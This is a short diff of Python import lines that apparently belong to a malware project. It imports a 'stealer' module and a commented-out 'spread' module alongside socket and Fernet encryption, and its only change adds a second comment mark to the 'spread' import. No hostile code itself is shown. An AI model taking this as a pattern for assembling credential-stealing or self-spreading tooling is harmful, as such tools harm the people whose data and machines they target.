@@ -18,7 +18,7 @@ import os
 import socket
 from datetime import datetime
 from cryptography.fernet import Fernet
-#from spread import *
+##from spread import *
 from stealer import stealer
 #endregion
 
